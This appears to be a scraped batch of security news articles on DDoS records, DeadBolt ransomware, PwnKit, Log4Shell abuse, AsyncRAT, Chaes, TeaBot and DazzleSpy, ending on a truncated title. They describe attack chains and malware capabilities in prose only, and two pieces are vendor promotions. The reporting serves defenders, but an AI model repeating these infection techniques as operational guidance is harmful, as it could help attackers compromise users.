'text': 'Microsoft this week revealed that it had fended off a record number of distributed denial-of-service (DDoS) attacks aimed at its customers in 2021, three of which surpassed 2.4 terabit per second (Tbps).\nOne of the DDoS attacks took place in November, targeting an unnamed Azure customer in Asia and lasted a total of 15 minutes. It hit a peak throughput of 3.47 Tbps and a packet rate of 340 million packets per second (pps), making it the largest attack ever reported in history.\n“This was a distributed attack originating from approximately 10,000 sources and from multiple countries across the globe, including the United States, China, South Korea, Russia, Thailand, India, Vietnam, Iran, Indonesia, and Taiwan,“ Alethea Toh, product manager of Azure Networking, said.\n\nDDoS attacks occur when several compromised devices are employed as a conduit to overwhelm a targeted server, service, or network with a flood of internet traffic with the goal of overloading the systems and disrupting its regular services.\nThen in December, Microsoft said it blocked two more attacks that surpassed 2.5 Tbps, both of which were aimed at customers in Asia. The first of the attacks was a 3.25 Tbps UDP attack, while the other intrusion was a 2.55 Tbps UDP flood that lingered for just a little over five minutes.\n\nThe report comes more than three months after the tech giant disclosed it acted to blunt a 2.4 Tbps DDoS attack in August 2021 targeting a European customer. Other previous record-breaking attacks include a 2.5 Tbps DDoS attack absorbed by Google in September 2017 and a 2.3 Tbps volumetric strike aimed at Amazon Web Services in February 2020.\nMicrosoft said it observed a rise in attacks that lasted longer than an hour in the second half of 2021, whereas the proportion of short-lived attacks that were 30 minutes or less dropped from 74% to 57%. That said, the longer duration assaults are experienced as a sequence of multiple short, repeated burst attacks.\n\nThe company also said it mitigated an average of 1,955 attacks per day, with a maximum of 4,296 attacks recorded in a single day on August 10, 2021. For the entirety of H2 2021, no fewer than 359,713 unique attacks against its infrastructure were blocked, a 43% increase from the first half of 2021.\nThe gaming industry emerged as the hardest hit sector, followed by financial institutions, media, internet service providers (ISPs), retail, and supply chain entities. Most of the targeted organizations were located in the U.S., India, East Asia (Hong Kong), Brazil, the U.K., South Korea, Japan, Australia, and the U.A.E.\n“We saw a sharp uptick in attacks in India, from just 2% of all attacks in the first half of 2021 to taking the second position at 23% of all attacks in the second half of 2021,“ Toh said. “Another driving factor may be that the acceleration of digital transformation, for example, the ’Digital India’ initiative, has increased the region’s overall exposure to cyber risks.“\n\n\nFound this article interesting?

'text': 'Taiwanese company QNAP has warned customers to secure network-attached storage (NAS) appliances and routers against a new ransomware variant called DeadBolt.\n“DeadBolt has been widely targeting all NAS exposed to the Internet without any protection and encrypting users’ data for Bitcoin ransom,“ the company said. “QNAP urges all QNAP NAS users to […] immediately update QTS to the latest available version.“\nA query on IoT search engine Censys shows that at least 3,687 devices have been encrypted by the DeadBolt ransomware so far, with most NAS devices located in the U.S., Taiwan, France, Italy, the U.K., Hong Kong, Germany, the Netherlands, Poland, and South Korea.\nIn addition, QNAP is also urging users to check if their NAS devices are public-facing, and if so, take steps to turn off the port forwarding function of the router and disable the Universal Plug and Play (UPnP) function of the QNAP NAS.\n\nThe advisory comes as Bleeping Computer revealed that QNAP NAS devices are being encrypted by the DeadBolt ransomware by exploiting a supposed zero-day vulnerability in the device’s software. The attacks are believed to have started on January 25.\nThe ransomware strain, which locks the files with a “.deadbolt“ file extension, demands that victims pay a ransom of 0.03 bitcoins (approximately $1,100) to a unique Bitcoin address in exchange for a decryption key.\n\nOn top of that, the operators of the ransomware claimed they are willing to offer complete details of the alleged zero-day flaw if QNAP pays them five bitcoins (~$186,700). It’s also ready to sell the master decryption key that can be used to unlock the files for all affected victims for an extra 45 bitcoins (~$1.7 million).\nWhile it’s not immediately clear if QNAP heeded to the extortion demand, the company, on Reddit, acknowledged that it had silently force-installed an emergency firmware update to “increase protection“ against the ransomware, adding “It is a hard decision to make. But it is because of DeadBolt and our desire to stop this attack as soon as possible that we did this.“\n\nQNAP devices have emerged a frequent target of ransomware groups and other criminal actors, prompting the company to issue numerous warnings in recent months. On January 7, it advised customers to safeguard their NAS devices from ransomware and brute-force attacks, and ensure that they are not exposed to the internet.\nWhen reached for a response, QNAP said the update was triggered as part of a QTS Auto Update feature. “QNAP PSIRT leveraged the feature updating QTS to prevent from DeadBolt ransomware or other malwares’ attack,“ the company told The Hacker News, adding the “malware exploited one of the vulnerabilities fixed in this release in QSA-21-57.“\nThe company also said the vulnerability relates to a flaw affecting QTS and QuTS hero operating systems that, if successfully exploited, could allow attackers to run arbitrary code in the affected system. The issue has been addressed in the following versions —\nQTS 5.0.0.1891 build 20211221 and laterQTS 4.5.4.1892 build 20211223 and laterQuTS hero h5.0.0.1892 build 20211222 and laterQuTScloud c5.0.0.1919 build 20220119 and later\nUpdate: QNAP, in a new statement shared today, disclosed that ransomware attacks involving DeadBolt exploited a vulnerability it patched in December, noting the updates will be applied automatically if the auto update option is toggled on. This is to “enhance security and protection of your QNAP NAS, mitigating the attack from criminals,“ the company said.\n\n\n\nFound this article interesting?

{'title': 'Patching the CentOS 8 Encryption Bug is Urgent – What Are Your Plans?',
'text': 'There are three things you can be sure of in life: death, taxes – and new CVEs. For organizations that rely on CentOS 8, the inevitable has now happened, and it didn’t take long. Just two weeks after reaching the official end of life, something broke spectacularly, leaving CentOS 8 users at major risk of a severe attack – and with no support from CentOS.\nYou’d think that this issue no longer affects a significant number of organizations because by now, companies would have migrated away from CentOS 8 to an OS that is actively supported by vendors. After all, vendor support is critical for security and compliance.\nBut as it always is with these things, you can count on the fact that a big chunk of CentOS 8 users are soldiering on with an unsupported OS, despite being aware of the risks. With that risk now crystallizing we’re using this article to examine CVE-2021-4122, the newly discovered vulnerability in LUKS encryption, and to discuss your options for mitigating it.\nWait, what is LUKS?\nSo what is LUKS? LUKS stands for Linux Unified Key Setup and is a mechanism used in Linux-powered systems to support, amongst other things, full disk encryption. It is recommended in many “best practice“ guides as an essential system hardening option for security-minded IT teams.\nHow does LUKS work? Well, during system deployment, you can create a partition that is only readable – i.e. the data within it is only understandable – with a user-supplied password. LUKS is quite complex and many security systems interact with LUKS, but a comprehensive LUKS guide is not the goal for this article.\nHaving a fully encrypted disk (block device in Linux “speak“) ensures that the data is safe from prying eyes even when at rest, meaning that an attacker that steals a laptop, for example, is still unable to view the confidential data contained in it.\nYou can further build on security by tying a specific block device to a specific computer through TPM (Trusted Platform Module). That adds another hurdle for an attacker, making it harder to physically pull encrypted data from a machine and plug it into a high-performance system with the goal of brute-forcing access to the data. Though, as always, how likely that is to succeed depends on computing power, selected encryption algorithm, and just sheer luck.\nOverall, LUKS provides excellent protection and for that reason, it’s frequently relied on to secure systems across a variety of organizations.\nUnderstanding the LUKS flaw\nCVE-2021-4122 was assigned late last year, but a full understanding of the security risks around LUKS has only recently emerged. As it turns out it is possible to, at least partially, decrypt a LUKS-encrypted disk and access the data on it without owning the password used to configure encryption.\nA key LUKS feature is the ability to change, on the fly, the key that is used to encrypt a given device. You would do this, for example, for scheduled key rotations in high security environments.\nThis on-the-fly re-encryption feature means that the device remains available during the key change process. It’s called “online re-encryption“ – which refers to the ability to re-encrypt a disk with a different key while it is online and in active use.\nIt’s within this process that a vulnerability was identified. It turns out that if you know what you’re doing you can perform this operation without owning the original, current, password. Even without a password, you can request a re-encryption.\nExploiting the flaw, this process would then appear to be aborted and some of the data would be made available unencrypted. At no point does the device experience any anomalous behavior, so it would be hard to spot an attacker doing the operation just by looking at the block device status.\nSysadmins are being strongly advised to upgrade cryptsetup, the package supporting LUKS, on all systems under their control, as the vulnerability can lead to information disclosure.\nOk, so I’ll just patch and move on…?\nExactly. That is what every single system administrator should do on their systems – replacing the affected package. But for some sysadmins this will be easier said than done. Which sysadmins will have a hard time? You guessed right – those still reliant on CentOS 8.\nMost vendors had early warning of the bug and are already providing updated packages for their distros. And just the same with Red Hat, which backs CentOS. But, with CentOS 8 now no longer officially supported, a CentOS 8 patch for the LUKS flaw is not going to appear.\nFor CentOS 8 users things are therefore quite bleak. Unpatched systems are vulnerable to data theft due to a published, widely known flaw. It is a serious situation and one way or another you should deploy up-to-date patched versions of the affected package.\nDoing nothing is not an option when confidential data is at risk. And, essentially, all your data is confidential and not for public disclosure (otherwise it would already have been made public), and you’re relying on a full disk encryption solution like LUKS precisely to avoid disclosure.\nYour patching options if you’re still on CentOS 8\nThere are two paths available to sysadmins relying on affected Linux systems operating past their end-of-life. One option is to download the upstream project source and to compile it locally, creating a replacement system package. The other option is to sign with an extended support vendor that will provide the patches no longer released by the original vendor.\nThe build-it-locally approach has drawbacks. First, the original project source code does not make any special allowances for a specific distribution. Each distribution or family of distributions all have their own quirks. The RHEL family, which includes CentOS, will have these quirks too.\nThat includes things like binary locations, service start configurations, settings, and so on. Your local team will have to manually adjust these. Whether your local IT team has the necessary expertise is a different question. Similarly, with tech teams generally under pressure to get things done, there is a risk that your DIY patching effort is delayed. Also, on the LUKS project page itself, there is this ominous “Please always prefer distro specific build tools to manually configuring cryptsetup“. \nYour alternative is to think about extended support vendors as a reliable, cost effective and easier approach to addressing this issue. TuxCare’s Extended Lifecycle Support service does just that. TuxCare delivers high quality patches for end of life distributions such as CentOS 8 and does so on time.\nWhat’s more you get full support for patches too. Deployment is simple, you deploy TuxCare patches just as easily as vendor-supported patches.\nYou must act - now\nIf you decide not to go for external support, you must nonetheless do something right now to protect your systems against the new vulnerability. You could decide to bite the bullet and compile cryptsetup and its dependencies locally, and perform the deployment across all your systems.\nBut it’s definitely not the last CVE to come out that affects CentOS 8. To give you some idea of the scope of what we’re talking about: even today there are still vulnerabilities coming out that affect CentOS 6 systems. How viable is it in the long run to keep dealing with a continuous stream of CVEs affecting CentOS 8?\nYou may be running CentOS 8 at this time because you were prevented from migrating to an alternative for one reason or another. It could be compatibility, support, or any one of multiple reasons.\nVulnerabilities won’t stop at EOL date, so make life easier for your IT teams, more secure for your security professionals, and meet compliance requirements around patching for your business - check out TuxCare’s family of services, and specifically Extended Lifecycle Support. It’s a solid way to obtain ongoing protection against new CVEs that affect CentOS 8 – buying you time to migrate to another OS.\n\n\nFound this article interesting?

'text': 'A financially-motivated malware campaign has compromised over 800 WordPress websites to deliver a banking trojan dubbed Chaes targeting Brazilian customers of Banco do Brasil, Loja Integrada, Mercado Bitcoin, Mercado Livre, and Mercado Pago.\nFirst documented by Cybereason in November 2020, the info-stealing malware is delivered via a sophisticated infection chain that’s engineered to harvest sensitive consumer information, including login credentials, credit card numbers, and other financial information.\n“Chaes is characterized by the multiple-stage delivery that utilizes scripting frameworks such as JScript, Python, and NodeJS, binaries written in Delphi, and malicious Google Chrome extensions,“ Avast researchers Anh Ho and Igor Morgenstern said. “The ultimate goal of Chaes is to steal credentials stored in Chrome and intercept logins of popular banking websites in Brazil.“\n\nThe attack sequence is triggered when users visit one of the infected websites, upon which a pop-up is displayed, urging them to install a fake Java Runtime application. Should the user follow through the instructions, the rogue installer initiates a complex malware delivery routine that culminates in the deployment of several modules.\n\nSome of the intermediary payloads are not only encrypted but also hidden as commented-out code inside the HTML page of a Blogger blogspot domain (“awsvirtual[.]blogspot.com“). In the final stage, a JavaScript dropper downloads and installs as many as five Chrome extensions —\nOnline – A Delphi module used to fingerprint the victim and transmit the system information to a command-and-control (C2) serverMtps4 (MultiTela Pascal) – A Delphi-based backdoor whose main purpose is to connect to the C2 server and wait for a responding Pascal Script to executeChrolog (ChromeLog) – A Google Chrome password stealer written in DelphiChronodx (Chrome Noder) – A JavaScript trojan that, upon detecting the launch of Chrome browser by the victim, closes it immediately and reopens its own instance of Chrome containing a malicious module that steals banking informationChremows (Chrome WebSocket) – A JavaScript banking trojan that records keypresses and mouse clicks on Chrome with the goal of plundering login credentials from users of Mercado Livre and Mercado Pago\n\nStating that the attacks are ongoing, Avast said that it had shared its findings with the Brazilian CERT to disrupt the malware’s spread. That said, Chaes-related artifacts continue to remain on some of the infected websites.\n“Chaes exploits many websites containing CMS WordPress to serve malicious installers,“ the researchers concluded. “The Google Chrome extensions are able to steal users’ credentials stored in Chrome and collect users’ banking information from popular banking websites.“\n\n\nFound this article interesting?

{'title': 'Widespread FluBot and TeaBot Malware Campaigns Targeting Android Devices',
'text': 'Researchers from the Bitdefender Mobile Threats team said they have intercepted more than 100,000 malicious SMS messages attempting to distribute Flubot malware since the beginning of December.\n“Findings indicate attackers are modifying their subject lines and using older yet proven scams to entice users to click,“ the Romanian cybersecurity firm detailed in a report published Wednesday. “Additionally, attackers are rapidly changing the countries they are targeting in this campaign.“\nThe new wave of attacks is said to have been most active in Australia, Germany, Poland, Spain, Austria, and Italy, among others, with attacks spreading to newer countries like Romania, the Netherlands, and Thailand starting mid-January.\nFluBot (aka Cabassous) campaigns use smishing as the primary delivery method to target potential victims, wherein users receive an SMS message with the question “Is this you in this video?“ and are tricked into clicking a link that installs the malware.\n\n“This new vector for banking trojans shows that attackers are looking to expand past the regular malicious SMS messages,“ the researchers said.\nTeaBot masquerades as QR Code Scanner Apps\nIt’s not just FluBot. Another Android trojan called TeaBot (aka Anatsa) has been observed lurking on the Google Play Store in the form of an app named “QR Code Reader - Scanner App,“ attracting no fewer than 100,000 downloads while delivering 17 different variants of the malware between December 6, 2021, and January 17, 2022.\nIn a tactic that’s becoming increasingly common, the app does offer the promised functionality, but it’s also designed to retrieve a malicious APK file hosted on GitHub, but not before ascertaining that the country code of the current registered operator doesn’t start with a “U.“\nThe installation of the rogue app then involves presenting a fake UI notifying the user that an add-on update is required and that the setting to allow installs from unknown sources needs to be enabled in order to apply the update.\n\nBitDefender said it identified four more dropper apps — 2FA Authenticator, QR Scanner APK, QR Code Scan, and Smart Cleaner — that were available on the Play Store and distributed the TeaBot malware since at least April 2021.\nAnother technique of interest adopted by the operators is versioning, which works by submitting a benign version of an app to the app store for purposes of evading the review process put in place by Google, only to replace the codebase over time with additional malicious functionality through updates at a later date.\nBeyond circumventing the Play Store protections to reach a wider infection pool, the malware authors are believed to have paid to appear in Google Ads served within other legitimate applications and games, “giving them screen time in an app that could have millions of users.“\n\nThe analysis also corroborates a previous report from Dutch cybersecurity firm ThreatFabric, which found six Anatsa droppers on the Play Store since June 2021. The apps were programmed to download an “update“ followed by prompting users to grant them Accessibility Service privileges and permissions to install apps from unknown third-party sources.\nIn a related development, researchers from Pradeo found that a two-factor authenticator app called “2FA Authenticator“ distributed through the Google Play store and downloaded more than 10,000 times was saddled with a banking trojan named Vultr, which targets financial services to steal users’ banking information.\n\n“The application called 2FA Authenticator is a dropper leveraged to spread malware on its users’ devices,“ the researchers said. “It has been developed to look legitimate and provide a real service. To do so, its developers used the open-source code of the official Aegis authentication application to which they injected malicious code.“\n“Malicious actors treat malware like a product, with development and versioning, working hard to circumvent security technologies and gain more victims,“ Richard Melick, director of product strategy for endpoint security at Zimperium, said.\n“When one version gets disrupted, the malicious actors go back to developing the next version, especially when the outcomes have been effective. And the mobile endpoint is an incredibly lucrative target for attackers,“ Melick added.\nFrom GriftHorse to Dark Herring\nThe development comes as Zimperium zLabs disclosed details of yet another premium service abuse campaign along the lines of GriftHorse that leveraged as many as 470 innocuous-looking apps to subscribe users to paid services costing $15 per month without their knowledge.\nThe billing fraud, also categorized as “fleeceware,“ is said to have affected upwards of 105 million users across more than 70 countries, with most victims located in Egypt, Finland, India, Pakistan, and Sweden.\nThe mammoth operation, which the mobile security company codenamed “Dark Herring,“ has been backtraced to March 2020, making it one of the longest-running mobile SMS scams discovered to date.\nWhile the huge nest of trojan apps have since been purged from the Play Store, they are still available on third-party app stores, once again underscoring the potential dangers when it comes to sideloading applications onto mobile devices.\n“In addition to over 470 Android applications, the distribution of the applications was extremely well-planned, spreading their apps across multiple, varied categories, widening the range of potential victims,“ Zimperium researcher Aazim Yaswant said. “The apps themselves also functioned as advertised, increasing the false sense of confidence.“\n\n\nFound this article interesting?

{'title': 'Hackers Using New Evasive Technique to Deliver AsyncRAT Malware',
'text': 'A new, sophisticated phishing attack has been observed delivering the AsyncRAT trojan as part of a malware campaign that’s believed to have commenced in September 2021.\n“Through a simple email phishing tactic with an HTML attachment, threat attackers are delivering AsyncRAT (a remote access trojan) designed to remotely monitor and control its infected computers through a secure, encrypted connection,“ Michael Dereviashkin, security researcher at enterprise breach prevention firm Morphisec, said in a report.\n\nThe intrusions commence with an email message containing an HTML attachment that’s disguised as an order confirmation receipt (e.g., Receipt-<digits>.html). Opening the decoy file redirects the message recipient to a web page prompting the user to save an ISO file.\nBut unlike other attacks that route the victim to a phishing domain set up explicitly for downloading the next-stage malware, the latest RAT campaign cleverly uses JavaScript to locally create the ISO file from a Base64-encoded string and mimic the download process.\n\n“The ISO download is not generated from a remote server but from within the victim’s browser by a JavaScript code that’s embedded inside the HTML receipt file,“ Dereviashkin explained.\nWhen the victim opens the ISO file, it is automatically mounted as a DVD Drive on the Windows host and includes either a .BAT or a .VBS file, which continues the infection chain to retrieve a next-stage component via a PowerShell command execution.\nThis results in the execution of a .NET module in-memory that subsequently acts as a dropper for three files — one acting as a trigger for the next — to finally deliver AsyncRAT as the final payload, while also checking for antivirus software and setting up Windows Defender exclusions.\n\nRATs such as AsyncRAT are typically used to forge a remote link between a threat actor and a victim device, steal information, and conduct surveillance through microphones and cameras. They provide an array of advanced capabilities that give the attackers the ability to fully monitor and control the compromised machines.\nMorphisec also pointed out the campaign’s advanced tactics, which it said allowed the malware to slip through virtually undetected by most antimalware engines despite the operation being in effect for close to five months.\n\n\nFound this article interesting?

'text': 'An initial access broker group tracked as Prophet Spider has been linked to a set of malicious activities that exploits the Log4Shell vulnerability in unpatched VMware Horizon Servers.\nAccording to new research published by BlackBerry Research & Intelligence and Incident Response (IR) teams today, the cybercrime actor has been opportunistically weaponizing the shortcoming to download a second-stage payload onto the victimized systems.\nThe payloads observed include cryptocurrency miners, Cobalt Strike Beacons, and web shells, corroborating a previous advisory from the U.K. National Health Service (NHS) that sounded the alarm on active exploitation of the vulnerabilities in VMware Horizon servers to drop malicious web shells and establish persistence on affected networks for follow-on attacks.\n\nLog4Shell is a moniker used to refer to an exploit affecting the popular Apache Log4j library that results in remote code execution by logging a specially crafted string. Since public disclosure of the flaw last month, threat actors have been quick to operationalize this new attack vector for a variety of intrusion campaigns to gain full control of affected servers.\nBlackBerry said it observed instances of exploitation mirroring tactics, techniques, and procedures (TTPs) previously attributed to the Prophet Spider eCrime cartel, including the use of “C:\Windows\Temp\7fde\“ folder path to store malicious files and “wget.bin“ executable to fetch additional binaries as well as overlaps in infrastructure used by the group.\n\n“Prophet Spider primarily gains access to victims by compromising vulnerable web servers, and uses a variety of low-prevalence tools to achieve operational objectives,“ CrowdStrike noted in August 2021, when the group was spotted actively exploiting flaws in Oracle WebLogic servers to gain initial access to target environments.\nLike with many other initial access brokers, the footholds are sold to the highest bidder on underground forums located in the dark web, who then exploit the access for ransomware deployment. Prophet Spider is known to be active since at least May 2017.\n\nThis is far from the first time internet-facing systems running VMware Horizon have come under attack using Log4Shell exploits. Earlier this month, Microsoft called out a China-based operator tracked as DEV-0401 for deploying a new ransomware strain called NightSky on the compromised servers.\nThe onslaught against Horizon servers has also prompted VMware to urge its customers to apply the patches immediately. “The ramifications of this vulnerability are serious for any system, especially ones that accept traffic from the open Internet,“ the virtualization services provider cautioned.\n“When an access broker group takes interest in a vulnerability whose scope is so unknown, it’s a good indication that attackers see significant value in its exploitation,“ Tony Lee, vice president of global services technical operations at BlackBerry, said.\n“It’s likely that we will continue to see criminal groups exploring the opportunities of the Log4Shell vulnerability, so it’s an attack vector against which defenders need to exercise constant vigilance,“ Lee added.\n\n\nFound this article interesting?

'text': 'The subject of threat visibility is a recurring one in cybersecurity. With an expanding attack surface due to the remote work transformation, cloud and SaaS computing and the proliferation of personal devices, seeing all the threats that are continuously bombarding the company is beyond challenging. This especially rings true for small to medium-sized enterprises with limited security budgets and lean IT security teams.\nAn upcoming webinar (register here) tries to help lean security teams understand how to tackle this intractable problem. While adding security solutions to cover blind spots seems logical, the webinar will argue that this just leads to more alarms and more noise. While this approach might be workable for large security teams, smaller teams simply don’t have the bandwidth to handle an increase in alerts.\nInstead, organizations need broad threat visibility to cover the current blind spots, but then needs the ability to combine, rank and filter alarms by importance. In that way, security teams can know more but respond less – an inversion of the current situation.\nThe Three Keys for Threat Visibility\nThe three requirements for achieving maximizing visibility are: \nImplementing Specific Security Technologies \nWhile more technologies may seem better, the key is choosing the right set of technologies that cover the most important parts of the IT environment. The technologies include NGAV, EDR, NDR, UBA, Deception, SIEM, SOAR.\nIntegrate Everything for a 360 Degree View\nImplementing the technologies listed above as stand-alone components only leads to visibility gaps, alert overload and missed threats. Look to newer XDR solutions to integrate real-time signals from multiple points of telemetry on a single platform. \nAutomate Response Actions to Improve Reflexes\nWith improved threat visibility and accuracy, IT security teams – and especially lean teams – need to react quickly to thwart identified threats. Automation improves both speed and scale more than an army of security pros could–so long as it is integrated within the XDR. \nDigging Deeper\nThe lack of threat visibility is unfortunately all too common in most companies today, especially SMEs. The fault is not with the SME’s lean security teams, but with the dearth of affordable, well-designed vendor offerings to provide this necessary capability. The Cynet webinar will dig into the emerging XDR technologies and demonstrate how they can finally help close the visibility gap simply, affordably, and effectively. \nRegister to the threat visibility webinar here \n\n\nFound this article interesting?

'text': 'Google on Tuesday announced that it is abandoning its controversial plans for replacing third-party cookies in favor of a new Privacy Sandbox proposal called Topics, which categorizes users’ browsing habits into approximately 350 topics.\nThe new mechanism, which takes the place of FLoC (short for Federated Learning of Cohorts), slots users’ browsing history for a given week into a handful of top pre-designated interests (i.e., topics), which are retained only on the device for a revolving period of three weeks.\nSubsequently, when a user visits a participating site, the Topics API selects three of the interests — one topic from each of the past three weeks — to share with the site and its advertising partners. To give more control over the framework, users can not only see the topics but also remove topics or disable it altogether.\n\nBy labeling each website with a recognizable, high-level topic and sharing the most frequent topics associated with the browsing history, the idea is to facilitate interest-based advertising by showing users more relevant ads, without needing to know the specific sites that have been visited.\nTopics, which is expected to be launched as a developer trial in Chrome browser, employs machine learning to infer topics from hostnames and is designed to exclude sensitive categories, such as sexual orientation, religion, gender, or race, Google pointed out.\n\n“Because Topics is powered by the browser, it provides you with a more recognizable way to see and control how your data is shared, compared to tracking mechanisms like third-party cookies,“ Vinay Goel, privacy director of Privacy Sandbox, said.\n“And, by providing websites with your topics of interest, online businesses have an option that doesn’t involve covert tracking techniques, like browser fingerprinting, in order to continue serving relevant ads,“ Goel added.\n\nThe development comes exactly seven months after Google said it was delaying the rollout of FLoC from early 2022 to late 2023 following sustained blowback from privacy advocates and publishers alike, prompting the company to acknowledge that “more time is needed across the ecosystem to get this right.“\n\nTopics also hopes to rework some of the core concerns with FLoC, which was branded by the Electronic Frontier Foundation (EFF) as a terrible idea that created more privacy risks for users.\nParticularly, FLoC drew criticism for constructing “cohorts“ from a combination of different online interests that could lead to classifying users in a manner that could increase the risk of discrimination. What’s more, should a cohort be deemed too small, then it could be combined with other tracking information to uniquely identify an individual, effectively undermining the privacy protections.\nThe overhaul is part of the search giant’s plans to replace third-party cookies over privacy concerns. Privacy Sandbox, as the efforts are called, aim to develop privacy-focused alternatives that restrict tracking of users on the web while also maintaining existing web capabilities, including advertising.\n\n\nFound this article interesting?

'text': 'A 12-year-old security vulnerability has been disclosed in a system utility called Polkit that grants attackers root privileges on Linux systems, even as a proof-of-concept (PoC) exploit has emerged in the wild merely hours after technical details of the bug became public.\nDubbed “PwnKit“ by cybersecurity firm Qualys, the weakness impacts a component in polkit called pkexec, a program that’s installed by default on every major Linux distribution such as Ubunti, Debian, Fedora, and CentOS.\nPolkit (formerly called PolicyKit) is a toolkit for controlling system-wide privileges in Unix-like operating systems, and provides a mechanism for non-privileged processes to communicate with privileged processes.\n\n“This vulnerability allows any unprivileged user to gain full root privileges on a vulnerable host by exploiting this vulnerability in its default configuration,“ Bharat Jogi, director of vulnerability and threat research at Qualys, said, adding it “has been hiding in plain sight for 12+ years and affects all versions of pkexec since its first version in May 2009.“\nThe flaw, which concerns a case of memory corruption and has been assigned the identifier CVE-2021-4034, was reported to Linux vendors on November 18, 2021, following which patches have been issued by Debian, Red Hat, and Ubuntu.\npkexec, analogous to the sudo command, allows an authorized user to execute commands as another user, doubling as an alternative to sudo. If no username is specified, the command to be executed will be run as the administrative super user, root.\nPwnKit stems from an out-of-bounds write that enables the reintroduction of “unsecure“ environment variables into pkexec’s environment. While this vulnerability is not remotely exploitable, an attacker that has already established a foothold on a system via another means can weaponize the flaw to achieve full root privileges.\n\nComplicating matters is the emergence of a PoC in the wild, which CERT/CC vulnerability analyst Will Dormann called “simple and universal,“ making it absolutely vital that the patches are applied as soon as possible to contain potential threats.\nThe development marks the second security flaw uncovered in Polkit in as many years. In June 2021, GitHub security researcher Kevin Backhouse revealed details of a seven-year-old privilege escalation vulnerability (CVE-2021-3560) that could be abused to escalate permissions to the root user.\nOn top of that, the disclosure also arrives close on the heels of a security flaw affecting the Linux kernel (CVE-2022-0185) that could be exploited by an attacker with access to a system as an unprivileged user to escalate those rights to root and break out of containers in Kubernetes setups.\n\n\nFound this article interesting?

{'title': 'Hackers Exploited MSHTML Flaw to Spy on Government and Defense Targets',
'text': 'Cybersecurity researchers on Tuesday took the wraps off a multi-stage espionage campaign targeting high-ranking government officials overseeing national security policy and individuals in the defense industry in Western Asia.\nThe attack is unique as it leverages Microsoft OneDrive as a command-and-control (C2) server and is split into as many as six stages to stay as hidden as possible, Trellix — a new company created following the merger of security firms McAfee Enterprise and FireEye — said in a report shared with The Hacker News.“This type of communication allows the malware to go unnoticed in the victims’ systems since it will only connect to legitimate Microsoft domains and won’t show any suspicious network traffic,“ Trellix explained.\nFirst signs of activity associated with the covert operation are said to have commenced as early as June 18, 2021, with two victims reported on September 21 and 29, followed by 17 more in a short span of three days between October 6 and 8.\n\n“The attack is particularly unique due to the prominence of its victims, the use of a recent [security flaw], and the use of an attack technique that the team had not seen before,“ Christiaan Beek, lead scientist at Trellix, said. “The objective was clearly espionage.“\nTrellix attributed the sophisticated attacks with moderate confidence to the Russia-based APT28 group, also tracked under the monikers Sofacy, Strontium, Fancy Bear, and Sednit, based on similarities in the source code as well as in the attack indicators and geopolitical objectives.\n\n“We are supremely confident that we are dealing with a very skilled actor based on how infrastructure, malware coding and operation were set up,“ Trellix security researcher Marc Elias said.\nThe infection chain begins with the execution of a Microsoft Excel file containing an exploit for the MSHTML remote code execution vulnerability (CVE-2021-40444), which is used to run a malicious binary that acts as the downloader for a third-stage malware dubbed Graphite.\n\nThe DLL executable uses OneDrive as the C2 server via the Microsoft Graph API to retrieve additional stager malware that ultimately downloads and executes Empire, an open-source PowerShell-based post-exploitation framework widely abused by threat actors for follow-on activities.\n“Using the Microsoft OneDrive as a command-and-control Server mechanism was a surprise, a novel way of quickly interacting with the infected machines by dragging the encrypted commands into the victim’s folders,“ Beek explained. “Next OneDrive would sync with the victim’s machines and encrypted commands being executed, whereafter the requested info was encrypted and sent back to the OneDrive of the attacker.“\nIf anything, the development marks the continued exploitation of the MSTHML rendering engine flaw, with Microsoft and SafeBreach Labs disclosing multiple campaigns that have weaponized the vulnerability to plant malware and distribute custom Cobalt Strike Beacon loaders.\n“The main takeaway is to highlight the level of access threat campaigns, and in particular how capable threat actors are able to permeate the most senior levels of government,“ Raj Samani, chief scientist and fellow at Trellix told The Hacker News. “It is of paramount importance that security practitioners tasked with protecting such high value systems consider additional security measures to prevent, detect and remediate against such hostile actions.“\n\n\nFound this article interesting?

{'title': 'Hackers Infect macOS with New DazzleSpy Backdoor in Watering-Hole Attacks',
'text': 'A previously undocumented cyber-espionage malware aimed at Apple’s macOS operating system leveraged a Safari web browser exploit as part of a watering hole attack targeting politically active, pro-democracy individuals in Hong Kong.\nSlovak cybersecurity firm ESET attributed the intrusion to an actor with “strong technical capabilities,“ calling out the campaign’s overlaps to that of a similar digital offensive disclosed by Google Threat Analysis Group (TAG) in November 2021.\nThe attack chain involved compromising a legitimate website belonging to D100 Radio, a pro-democracy internet radio station in Hong Kong, to inject malicious inline frames (aka iframes) between September 30 and November 4, 2021. Separately, a fraudulent website called “fightforhk[.]com“ was also registered for the purpose of luring liberation activists.\n\nIn the next phase, the tampered code acted as a conduit to load a Mach-O file by leveraging a remote code execution bug in WebKit that was fixed by Apple in February 2021 (CVE-2021-1789). “The exploit used to gain code execution in the browser is quite complex and had more than 1,000 lines of code once formatted nicely,“ ESET researchers said.\nThe success of the WebKit remote code execution subsequently triggers the execution of the intermediate Mach-O binary that, in turn, exploits a now-patched local privilege escalation vulnerability in the kernel component (CVE-2021-30869) to run the next stage malware as a root user.\n\nWhile the infection sequence detailed by Google TAG culminated in the installation of an implant called MACMA, the malware delivered to visitors of the D100 Radio site was a new macOS backdoor that ESET has codenamed DazzleSpy.\nThe malware provides attackers “a large set of functionalities to control, and exfiltrate files from, a compromised computer,“ the researchers explained, in addition to incorporating a number of other features, including —\nHarvesting system informationExecuting arbitrary shell commandsDumping iCloud Keychain using a CVE-2019-8526 exploit if the macOS version is lower than 10.14.4Starting or terminating a remote screen session, andDeleting itself from the machine\nAmong other interesting findings about the attacks is that once the malware obtains the current date and time on a compromised computer, it converts the obtained date to the Asia/Shanghai time zone (aka China Standard Time), before sending it to the command-and-control server.\n“This campaign has similarities with one from 2020 where LightSpy iOS malware (described by Trend Micro and Kaspersky) was distributed the same way, using iframe injection on websites for Hong Kong citizens leading to a WebKit exploit,“ the researchers said. That said, it’s not immediately clear if both the campaigns were orchestrated by the same group.\n\n\nFound this article interesting?

{'title': 'TrickBot Malware Using New Techniques to Evade Web Injection Attacks',
